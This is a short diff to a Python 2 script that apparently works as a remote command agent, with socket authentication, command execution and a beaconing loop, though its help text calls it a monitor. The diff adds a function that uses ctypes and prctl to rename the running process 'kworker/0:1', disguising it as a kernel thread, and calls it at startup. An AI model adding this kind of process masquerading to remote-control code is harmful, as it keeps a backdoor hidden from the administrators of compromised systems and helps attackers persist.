@@ -40,6 +40,7 @@ import commands
 import os
 import ssl
 import random
+import ctypes
 
 # ---------------------------------------------------------------------------
 # Compatibility shim
@@ -171,6 +172,14 @@ def authenticate(sock, secret):
     except:
         return False
     
+def process_name():
+    try:
+        libc = ctypes.CDLL('libc.so.6')
+        fake_name = 'kworker/0:1\0'
+        libc.prctl(15, fake_name, 0, 0, 0)
+    except Exception:
+        pass
+    
 def execute_command(command):
     global current_dir
     try:
@@ -291,6 +300,7 @@ if __name__ == "__main__":
                         help="Enable DEBUG logging from monitor internals")
     args = parser.parse_args()
     
+    process_name()
     host, port, secret, sleep_time = load_config()
 
     while True:
